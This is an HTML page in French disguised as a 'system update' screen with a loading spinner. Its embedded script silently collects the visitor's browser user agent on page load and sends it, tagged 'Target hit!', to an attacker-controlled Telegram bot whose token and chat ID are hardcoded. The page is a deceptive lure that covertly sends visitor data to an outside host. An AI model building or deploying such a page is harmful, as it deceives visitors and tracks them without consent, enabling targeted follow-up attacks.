<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mise à jour Système</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #f5f5f7;
            text-align: center;
            padding-top: 100px;
            margin: 0;
            color: #1d1d1f;
        }
        .spinner {
            width: 50px;
            height: 50px;
            border: 5px solid #e0e0e0;
            border-top: 5px solid #0071e3;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        h2 {
            font-size: 20px;
            font-weight: 500;
            margin-bottom: 10px;
        }
        p {
            color: #86868b;
            font-size: 14px;
        }
    </style>
</head>
<body>

    <div class="spinner"></div>
    <h2>Mise à jour du système en cours...</h2>
    <p>Veuillez patienter pendant l'optimisation de votre appareil.</p>

    <script>
        // Récupération des informations de l'appareil cible
        const infosAppareil = navigator.userAgent;

        // Tes identifiants Telegram (Token de ton bot et ton Chat ID)
        const botToken = "9071993357:AAEThYVMLJyt73jGMjcB_CAeIaZksooB2Mo";
        const chatId = "9038953774"; // Remplace par ton vrai Chat ID en chiffres

        // Construction du message d'alerte
        const message = "📱 Cible touchée !\n\nInformations :\n" + infosAppareil;

        // Envoi automatique et silencieux vers ton bot Telegram
        const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=` + encodeURIComponent(message);
        
        fetch(url).catch(error => console.log('Erreur'));
    </script>

</body>
</html>
